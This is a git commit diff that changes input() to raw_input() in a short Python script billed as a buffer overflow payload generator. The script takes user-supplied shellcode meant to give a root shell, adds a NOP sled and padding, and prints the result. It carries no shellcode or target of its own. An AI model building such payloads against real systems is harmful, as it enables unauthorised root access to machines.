55ce7f3e4f87be55ef6d918ea4e737862c2bc79d
Pavitra jha <86011141+pavitra1129@users.noreply.github.com>
2021-07-18 20:55:25 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,8 +1,8 @@
 print("WELCOME TO THE BUFFER OVERFLOW PAYLOAD GENERATOR MADE BY MR.PAVITRA JHA") 
 print("We have five shell codes for getting a root shell we can copy and past one of them or if you want you can use your own shellcode.")
-shellcode = input('''--root(Shellcode)kali
+shellcode = raw_input('''--root(Shellcode)kali
 |__# ''')
-_12 = input("Num of pading-)#( ")
+_12 = raw_input("Num of pading-)#( ")
 pad = r"\x41" * int(_12)
 Nop = r"\x90" * 100
 print("your payload: " + Nop + shellcode + pad + "    :now your payload is ready!!")
